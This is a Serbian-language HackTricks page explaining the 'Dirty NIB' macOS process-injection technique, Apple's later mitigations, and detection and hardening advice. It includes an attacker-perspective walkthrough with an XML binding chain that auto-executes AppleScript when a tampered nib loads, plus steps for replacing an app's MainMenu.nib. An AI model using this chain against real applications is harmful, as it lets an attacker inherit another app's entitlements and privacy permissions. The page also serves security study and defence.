# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB označava zloupotrebu Interface Builder datoteka (.xib/.nib) unutar potpisanog macOS app bundle-a radi izvršavanja logike pod kontrolom napadača unutar ciljnog procesa, čime se nasleđuju njegovi entitlements i TCC permissions. Ovu tehniku je prvobitno dokumentovao xpn (MDSec), a kasnije ju je generalizovao i značajno proširio Sector7, koji je takođe obradio Apple-ove mitigacije u macOS 13 Ventura i macOS 14 Sonoma.<sup>[[1]](#references)[[2]](#references)</sup> Za pozadinu i detaljne analize pogledajte reference na kraju.

> TL;DR
> • Pre macOS 13 Ventura: zamena MainMenu.nib datoteke bundle-a (ili drugog nib-a koji se učitava pri pokretanju) mogla je pouzdano da omogući process injection i često privilege escalation.
> • Od macOS 13 (Ventura), uz poboljšanja u macOS 14 (Sonoma): first-launch deep verification, bundle protection, Launch Constraints i nova TCC “App Management” permission uglavnom sprečavaju post-launch nib tampering od strane nepovezanih aplikacija. Napadi i dalje mogu biti izvodljivi u specifičnim slučajevima (npr. alati istog developera koji menjaju sopstvene aplikacije ili terminali kojima je korisnik dodelio App Management/Full Disk Access).

## Šta su NIB/XIB datoteke

Nib (skraćeno od NeXT Interface Builder) datoteke su serijalizovani UI object graph-ovi koje koriste AppKit aplikacije. Moderni Xcode čuva editabilne XML .xib datoteke, koje se tokom build-a kompajliraju u .nib. Tipična aplikacija učitava svoj glavni UI preko `NSApplicationMain()`, koji čita ključ `NSMainNibFile` iz app-ovog Info.plist-a i instancira object graph tokom izvršavanja.

Ključne tačke koje omogućavaju napad:
- NIB loading instancira proizvoljne Objective-C klase bez zahteva da budu kompatibilne sa NSSecureCoding (Apple-ov nib loader koristi `init`/`initWithFrame:` kao fallback kada `initWithCoder:` nije dostupan).
- Cocoa Bindings mogu biti zloupotrebljeni za pozivanje metoda dok se nib-ovi instanciraju, uključujući ulančane pozive koji ne zahtevaju interakciju korisnika.


## Dirty NIB injection proces (iz perspektive napadača)

Klasičan pre‑Ventura tok:
1) Kreiranje zlonamernog .xib-a
- Dodajte `NSAppleScript` objekat (ili druge “gadget” klase kao što je `NSTask`).
- Dodajte `NSTextField` čiji title sadrži payload (npr. AppleScript ili argumente komandi).
- Dodajte jedan ili više `NSMenuItem` objekata povezanih preko bindings-a za pozivanje metoda na ciljnom objektu.

2) Automatsko pokretanje bez klikova korisnika
- Koristite bindings da podesite target/selector stavke menija, a zatim pozovete privatnu metodu `_corePerformAction`, čime se akcija automatski izvršava prilikom učitavanja nib-a. Time se uklanja potreba da korisnik klikne na dugme.

Minimalni primer lanca za automatsko pokretanje unutar .xib-a (skraćeno radi jasnoće):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
Ovo omogućava proizvoljno izvršavanje AppleScript-a u ciljnom procesu pri učitavanju nib-a.<sup>[[1]](#references)</sup> Napredni lanci mogu da:
- Instanciraju proizvoljne AppKit klase (npr. `NSTask`) i pozovu metode bez argumenata kao što je `-launch`.
- Pozovu proizvoljne selectors sa object argumentima pomoću prethodno opisanog binding trika.
- Učitaju AppleScriptObjC.framework da bi napravili most ka Objective-C-ju i čak pozvali odabrane C API-je.
- Na starijim sistemima koji još uvek sadrže Python.framework, naprave most ka Python-u i zatim koriste `ctypes` za pozivanje proizvoljnih C funkcija (istraživanje kompanije Sector7).<sup>[[2]](#references)</sup>

3) Zamenite nib aplikacije
- Kopirajte target.app na lokaciju sa dozvolom za upis, zamenite npr. `Contents/Resources/MainMenu.nib` zlonamernim nib-om i pokrenite target.app. Pre Ventura sistema, nakon jednokratne Gatekeeper procene, naredna pokretanja su obavljala samo površinske provere potpisa, tako da resursi koji nisu izvršni (kao što je .nib) nisu ponovo proveravani.

Primer AppleScript payload-a za vidljivi test:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Moderne macOS zaštite (Ventura/Monterey/Sonoma/Sequoia)

Apple je uveo nekoliko sistemskih mitigacija koje dramatično smanjuju održivost tehnike Dirty NIB u modernom macOS-u:<sup>[[2]](#references)</sup>
- Dubinska verifikacija pri prvom pokretanju i zaštita bundle-a (macOS 13 Ventura)
- Pri prvom pokretanju bilo koje aplikacije (sa karantinom ili bez njega), dubinska provera potpisa obuhvata sve resurse bundle-a. Nakon toga bundle postaje zaštićen: samo aplikacije istog developera (ili aplikacije kojima je to izričito dozvoljeno) mogu menjati njegov sadržaj. Drugim aplikacijama je potrebna nova TCC dozvola “App Management” za upisivanje u bundle druge aplikacije.
- Launch Constraints (macOS 13 Ventura)
- System/Apple-bundled aplikacije ne mogu da se kopiraju na drugo mesto i pokrenu; ovo onemogućava pristup „kopiraj u /tmp, izmeni, pokreni“ za OS aplikacije.
- Poboljšanja u macOS 14 Sonoma
- Apple je dodatno ojačao App Management i ispravio poznate bypass-e (npr. CVE‑2023‑40450) koje je naveo Sector7. Python.framework je ranije uklonjen (macOS 12.3), čime su prekinuti neki lanci privilege-escalation napada.
- Gatekeeper/Quarantine promene
- Za širu diskusiju o Gatekeeper-u, poreklu i promenama u proceni koje su uticale na ovu tehniku, pogledajte stranicu navedenu ispod.

> Praktična posledica
> • Na Ventura+ verzijama generalno ne možete da menjate .nib fajl aplikacije treće strane, osim ako vaš proces ima App Management dozvolu ili je potpisan istim Team ID-jem kao ciljna aplikacija (npr. developer tooling).
> • Dodeljivanje App Management ili Full Disk Access dozvole shell-ovima/terminalima praktično ponovo otvara ovu attack surface za sve što može da izvršava code unutar konteksta tog terminala.


### Rešavanje Launch Constraints ograničenja

Launch Constraints od Ventura verzije blokira pokretanje mnogih Apple aplikacija sa lokacija koje nisu podrazumevane. Ako ste se oslanjali na workflow-e pre Ventura verzije, poput kopiranja Apple aplikacije u privremeni direktorijum, menjanja `MainMenu.nib` fajla i njenog pokretanja, očekujte da to neće raditi na verzijama >= 13.0.


## Enumerisanje targeta i nib fajlova (korisno za research / legacy sisteme)

- Pronađite aplikacije čiji je UI zasnovan na nib fajlovima:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- Pronađite potencijalne nib resurse unutar bundle-a:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Temeljno proverite potpise koda (provera neće uspeti ako ste menjali resurse, a zatim ih ponovo potpisali):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> Napomena: Na modernom macOS-u takođe će vas zaštita bundle-a/TCC blokirati pri pokušaju upisivanja u bundle druge aplikacije bez odgovarajuće autorizacije.


## Saveti za detekciju i DFIR

- Monitoring integriteta datoteka u resursima bundle-a
- Pratite promene mtime/ctime vrednosti za `Contents/Resources/*.nib` i druge neizvršne resurse u instaliranim aplikacijama.
- Unified logs i ponašanje procesa
- Pratite neočekivano izvršavanje AppleScript-a unutar GUI aplikacija i procese koji učitavaju AppleScriptObjC ili Python.framework. Primer:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Proaktivne procene
- Periodično pokrećite `codesign --verify --deep` nad kritičnim aplikacijama kako biste proverili da su resursi ostali neizmenjeni.
- Privilegovani kontekst
- Proverite ko/šta ima TCC dozvolu „App Management“ ili Full Disk Access (naročito terminali i management agenti). Uklanjanje ovih dozvola iz shell-ova opšte namene sprečava trivijalno ponovno omogućavanje manipulacije u stilu Dirty NIB-a.


## Ojačavanje zaštite (developers i defenders)

- Dajte prednost programskom UI-ju ili ograničite šta se instancira iz nib-ova. Izbegavajte uključivanje moćnih klasa (npr. `NSTask`) u nib grafove i izbegavajte bindings koji indirektno pozivaju selektore nad proizvoljnim objektima.
- Usvojite hardened runtime sa Library Validation (već je standard za moderne aplikacije). Iako ovo samo po sebi ne zaustavlja nib injection, blokira jednostavno učitavanje nativnog koda i napadače primorava na payload-e zasnovane samo na scripting-u.
- Ne zahtevajte niti se oslanjajte na široke App Management dozvole u alatima opšte namene. Ako MDM zahteva App Management, odvojite taj kontekst od shell-ova kojima upravlja korisnik.
- Redovno proveravajte integritet bundle-a svoje aplikacije i obezbedite da mehanizmi za update automatski popravljaju resurse bundle-a.


## Povezano štivo u HackTricks

Saznajte više o Gatekeeper-u, quarantine-u i promenama provenance-a koje utiču na ovu tehniku:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## Reference

- [1] [xpn – DirtyNIB (originalni write-up sa primerom za Pages)](https://blog.xpnsec.com/dirtynib/)
- [2] [Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (5. april 2024.)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)

{{#include ../../../banners/hacktricks-training.md}}
